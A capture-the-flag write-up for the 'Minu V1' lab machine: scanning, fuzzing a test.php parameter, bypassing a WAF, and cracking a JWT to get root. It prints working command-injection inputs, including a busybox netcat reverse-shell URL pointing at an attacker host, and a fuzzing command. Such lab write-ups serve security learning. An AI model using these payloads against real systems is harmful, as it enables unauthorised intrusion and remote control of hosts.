# Minu V1 Write Up

### Getting the Ip address of the target machine I used arp-scan in local network

> target ip: 192.168.100.14

### Target Scanning using nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.100.14                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 03:10 EDT
Nmap scan report for 192.168.100.14
Host is up (0.0025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.27
MAC Address: 08:00:27:E8:55:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds

```

Only http port (80) is open, lets open it in web browser and got the following page
![homepage](screenshots/homepage.png)

Using the nikto tool to get the vulnearabilities

```bash

┌──(kali㉿kali)-[~/Desktop/Machines_WriteUps/Minu_v1]
└─$ nikto -h http://192.168.100.14/           
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.14
+ Target Hostname:    192.168.100.14
+ Target Port:        80
+ Start Time:         2025-09-20 11:11:15 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.27 (Ubuntu)
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 56a9aee1bb80f, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-09-20 11:13:49 (GMT-4) (154 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

So here I got the hidden file `test.php`
![test.php page](./screenshots/test_php.png)

Here is the test.php page but I didn't got any interesting stuff.

Now I tested, the local file inclusive vulnearability, but WAP (Web Application Firewall) blocks it, so we need to bypass the filters and for this we have to supply some payloads until we get some response

For this, I will be using `wfuzz`, a web application fuzzer used for brute-forcing and testing web parameters.

```bash
wfuzz -c -u 'http://192.168.100.14/test.php?file=FUZZ' -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 403 --hw 159

# -u target URL
# -w wordlist
# --hc 403 hides responses with HTTP status code 403
# --hw 159 hides responses whose body has 159 words
```

Output:

```bash

┌──(kali㉿kali)-[~/Desktop/Machines_WriteUps/Minu_v1]
└─$ wfuzz -c -u 'http://192.168.100.14/test.php?file=FUZZ' -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 403 --hw 159
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.14/test.php?file=FUZZ
Total requests: 468

=====================================================================
ID           Response   Lines    Word       Chars       Payload                 
=====================================================================

000000046:   200        41 L     163 W      2033 Ch     "|dir"                  
000000045:   200        41 L     162 W      2040 Ch     "|id"                   

Total time: 5.707429
Processed Requests: 468
Filtered Requests: 466
Requests/sec.: 81.99838

```

So I got the following payload `|dir` and `|id` 
![payload working](screenshots/payload_1.png)

### Bypassing WAF

So I tested and many payload and got the interesting one that is `which` through I go the nc binary path, so we can establish reverse shell connection with target machine using netcat, but we will need a vulnearable binary to execute the nc command

The target machine is having `busybox` binary and its path is `/bin/busybox` so we can use this to execute the netcat.

For busybox payload I will be using [GTFIO BIns](https://gtfobins.github.io/gtfobins/busybox/)

So the payload goes as:

```bash

http://192.168.100.14/test.php?file=shell;busybox /b?n/nc 192.168.100.5 4433  -e sh

```

and got the reverse shell

![reverse shell](./screenshots/rev_shell.png)

As I got the reverse shell, after little bit enumeration I got a text file in path
`/home/bob` 

Its contents is:

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

It is JWT token, so to crack this I used [JWT cracker](https://github.com/brendan-rius/c-jwt-cracker) and the secret is `mlnV1`

Let's use this as root user password 
![flag](./screenshots/flag.png)

## Got the FLAG 🚩🚩

## Key Learnings
.

🌐 Web fuzzing & file inclusion:

- Hidden endpoints (test.php) can reveal vulnerabilities.

- Local File Inclusion (LFI) can sometimes be combined with command injection (e.g., payloads like |id).

🛡️ Bypassing WAF:

- Try variations of payloads and fuzzers (wfuzz) to identify allowed characters/commands.

- Use known exploits from resources like GTFOBins for binaries available on the host (busybox here).

🖥️ Privilege escalation / gaining shell:

- Reverse shells via netcat or busybox can provide access when direct execution is blocked.

🔑 Post-exploitation:

- Enumerate user directories to find sensitive data (e.g., JWT tokens).

- Decode/crack JWT secrets; they might act as credentials for privilege escalation.

🚩 General tips:

- Systematic enumeration → exploit → shell → escalate → loot is a solid workflow.

- Document every step and payload for future reference